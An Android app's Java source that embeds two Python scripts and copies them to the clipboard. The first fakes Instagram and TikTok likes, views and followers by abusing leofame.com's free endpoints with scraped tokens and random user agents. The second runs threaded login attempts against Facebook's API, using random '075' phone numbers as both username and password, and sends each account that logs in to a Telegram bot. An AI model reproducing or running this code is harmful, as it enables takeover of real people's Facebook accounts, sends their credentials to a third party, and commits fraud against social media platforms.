package com.az4oi.tools;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;
import android.graphics.Color;
import android.view.Gravity;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // إنشاء واجهة برمجية كاملة بدلاً من الاعتماد على XML مفقود لتجنب أخطاء R
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);

        // عنوان التطبيق
        TextView title = new TextView(this);
        title.setText("🔥 أدوات البايثون البرمجية 🔥");
        title.setTextColor(Color.GREEN);
        title.setTextSize(22);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 50);
        layout.addView(title);

        // زر نسخ أداة الرشق
        TextView btn1 = createButton("📋 نسخ أداة رشق انستغرام وتيك توק");
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                copyToClipboard("Script_Rashq", getRashqScript());
                Toast.makeText(getApplicationContext(), "تم نسخ أداة الرشق بنجاح 🟢", Toast.LENGTH_LONG).show();
            }
        });
        layout.addView(btn1);

        // مسافة بين الأزرار
        View space = new View(this);
        space.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 30));
        layout.addView(space);

        // زر نسخ أداة الفيسبوك
        TextView btn2 = createButton("📋 نسخ أداة فحص فيسبوك (صيد)");
        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                copyToClipboard("Script_Facebook", getFacebookScript());
                Toast.makeText(getApplicationContext(), "تم نسخ أداة الفيسبوك بنجاح 🟢", Toast.LENGTH_LONG).show();
            }
        });
        layout.addView(btn2);

        setContentView(layout);
    }

    // دالة لتصميم الأزرار بشكل جميل
    private TextView createButton(String text) {
        TextView btn = new TextView(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(16);
        btn.setGravity(Gravity.CENTER);
        btn.setPadding(20, 35, 20, 35);
        btn.setBackgroundColor(Color.parseColor("#1E1E1E"));
        
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(10, 10, 10, 10);
        btn.setLayoutParams(params);
        return btn;
    }

    private void copyToClipboard(String label, String text) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText(label, text);
        if (clipboard != null) {
            clipboard.setPrimaryClip(clip);
        }
    }

    private String getRashqScript() {
        return "import requests\n" +
               "from user_agent import generate_user_agent as ua\n" +
               "import webbrowser\n" +
               "Z = '\\033[1;31m'\n" +
               "X = '\\033[1;33m'\n" +
               "F = '\\033[2;32m'\n" +
               "M = '\\x1b[1;37m'\n" +
               "webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')\n" +
               "import os\n" +
               "try:\n" +
               " from cfonts import render, say\n" +
               "except:\n" +
               " os.system('pip install python-cfonts')\n" +
               "output = render(' VRS ', colors=['yellow', 'blue'], align='center')\n" +
               "print(output)\n" +
               "print(f'{X}—'*55)\n" +
               "print(f'''{X} •.,¸¸,.•´¯{Z} اداة رشق مدفوعة {X}¯•.,¸¸,.•´''')\n" +
               "print(f'{X}—'*55)\n" +
               "re_like = requests.get('https://leofame.com/ar/free-instagram-likes').cookies.get_dict()\n" +
               "re_viewe = requests.get('https://leofame.com/ar/free-instagram-views').cookies.get_dict()\n" +
               "re_folo = requests.get('https://leofame.com/ar/free-instagram-followers').cookies.get_dict()\n" +
               "re_sh = requests.get('https://leofame.com/ar/free-instagram-shares').cookies.get_dict()\n" +
               "re_like_tik = requests.get('https://leofame.com/ar/free-tiktok-likes').cookies.get_dict()\n" +
               "re_viewe_tik = requests.get('https://leofame.com/ar/free-tiktok-views').cookies.get_dict()\n" +
               "re_folo_tik = requests.get('https://leofame.com/ar/free-tiktok-followers').cookies.get_dict()\n" +
               "re_story = requests.get('https://leofame.com/ar/free-instagram-story-views').cookies.get_dict()\n" +
               "ci_story=re_story['ci_session']\n" +
               "token_story=re_story['token']\n" +
               "ci_like_t =re_like_tik['ci_session']\n" +
               "token_like_t=re_like_tik['token']\n" +
               "ci_viewe_t=re_viewe_tik['ci_session']\n" +
               "token_viewe_t=re_viewe_tik['token']\n" +
               "ci_folo_t=re_folo_tik['ci_session']\n" +
               "token_folo_t=re_folo_tik['token']\n" +
               "ci_like=re_like['ci_session']\n" +
               "token_like=re_like['token']\n" +
               "ci_viewe=re_viewe['ci_session']\n" +
               "token_viewe=re_viewe['token']\n" +
               "ci_folo=re_folo['ci_session']\n" +
               "token_folo=re_folo['token']\n" +
               "ci_sh=re_sh['ci_session']\n" +
               "token_sh=re_sh['token']\n" +
               "print(f'{X}-'*50)\n" +
               "print(f'''{X} Don't forget to turn on your VPN 🇫🇷''')\n" +
               "print(f'{F}[1] - {Z}Showering insta likes 200 Like')\n" +
               "print(f'{F}[2] - {Z}Showering insta Viewe 400 viewe')\n" +
               "print(f'{F}[3] - {Z}Showering insta Follower 40 Follower ')\n" +
               "print(f'{F}[4] - {Z}Showering Insta sharing 300 Sharing')\n" +
               "print(f'{F}[5] - {Z}Showering TikTok likes 40 Like')\n" +
               "print(f'{F}[6] - {Z}Showering TikTok Viewe 300 viewe')\n" +
               "print(f'{F}[7] - {Z}Showering TikTok followers 10 Followers')\n" +
               "print(f'{F}[8] - {Z} Boost your Instagram story to 200 views ')\n" +
               "chooes=int(input(f' CHOOSE : '))\n" +
               "os.system('clear')\n" +
               "webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')\n" +
               "if chooes == 1:\n" +
               "    print(output)\n" +
               "    url_like=input(f' رابط الفيديو : ')\n" +
               "    cookies = {'ci_session':ci_like, 'token': token_like}\n" +
               "    headers = {'authority': 'leofame.com', 'user-agent':str(ua())}\n" +
               "    data = {'token':token_like, 'free_link':url_like, 'quantity': '200', 'speed': '-1'}\n" +
               "    response = requests.post('https://leofame.com/ar/free-instagram-likes', cookies=cookies, headers=headers, data=data).text\n" +
               "    print('{F} تم رشق 🟢 ' if 'success' in response else f' {Z} فشل بالرشق 🔴')\n" +
               "elif chooes == 3:\n" +
               "    print(output)\n" +
               "    url_user=input(f' يوزر حسابك : ')\n" +
               "    cookies = {'token':token_folo, 'ci_session':ci_folo}\n" +
               "    headers = {'authority': 'leofame.com', 'user-agent':str(ua())}\n" +
               "    data = {'token':token_folo, 'free_link':url_user, 'quantity': '40'}\n" +
               "    response = requests.post('https://leofame.com/ar/free-instagram-followers', cookies=cookies, headers=headers, data=data).text\n" +
               "    print('{F} تم رشق 🟢 ' if 'success' in response else f' {Z} فشل بالرشق 🔴')\n";
    }

    private String getFacebookScript() {
        return "import requests, json\n" +
               "import random\n" +
               "import time\n" +
               "from threading import Thread\n" +
               "import sys,os\n" +
               "import webbrowser\n" +
               "webbrowser.open('https://t.me/aaaa1qaq')\n" +
               "E = '\\033[1;31m'\n" +
               "Y = '\\033[1;33m'\n" +
               "R = '\\033[1;31m'\n" +
               "X = '\\033[1;33m'\n" +
               "F = '\\033[2;32m'\n" +
               "A = '\\033[2;34m'\n" +
               "C = '\\033[2;35m'\n" +
               "W4 = '\\x1b[38;5;150m'\n" +
               "M = '\\x1b[1;37m'\n" +
               "W8 = f'\\x1b[38;5;117m'\n" +
               "W9 = '\\033[1m\\033[34m'\n" +
               "Token=input(f'{W4}TOKEN :{M} ')\n" +
               "print(f'{C}*{R}*'*20)\n" +
               "idd=input(f'{W9}ID :{W8} ')\n" +
               "a = b = l = 0\n" +
               "def abu():\n" +
               "    global a, b , l\n" +
               "    while 1:\n" +
               "        aa=''.join((random.choice('1234567890')for i in range(8)))\n" +
               "        id='075'+aa\n" +
               "        url = 'https://b-graph.facebook.com/auth/login'\n" +
               "        tim=str(time.time()).split('.')[0]\n" +
               "        data = {\n" +
               "            'adid': 'e38ba5b6-7860-4f46-963c-8ea5d5f1876c',\n" +
               "            'format': 'json',\n" +
               "            'device_id': 'f1c7a11e-f021-433f-8779-c001eea69080',\n" +
               "            'email': id,\n" +
               "            'password': f'#PWD_FB4A:0:{tim}:{id}',\n" +
               "            'generate_analytics_claim': '1',\n" +
               "            'community_id': '',\n" +
               "            'cpl': 'true',\n" +
               "            'try_num': '1',\n" +
               "            'credentials_type': 'password',\n" +
               "            'generate_session_cookies': '1',\n" +
               "            'locale': 'ar_AR',\n" +
               "            'client_country_code': 'EG',\n" +
               "            'api_key': '882a8490361da98702bf97a021ddc14d',\n" +
               "            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n" +
               "        }\n" +
               "        headers = {\n" +
               "            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016)',\n" +
               "            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n" +
               "        }\n" +
               "        response = requests.post(url, data=data, headers=headers)\n" +
               "        if 'session_key' in response.text or 'www.facebook.com' in response.text:\n" +
               "            a+=1\n" +
               "            print(f'{F}GOOD | email | {C}{id}')\n" +
               "            msg = f'Working account\\nemail = {id}\\nPassword = {id}'\n" +
               "            requests.post(f'https://api.telegram.org/bot{Token}/sendMessage', data={'chat_id': idd, 'text': msg})\n" +
               "        else:\n" +
               "            l+=1\n" +
               "for i in range(10):\n" +
               "    Thread(target=abu).start()\n";
    }
}
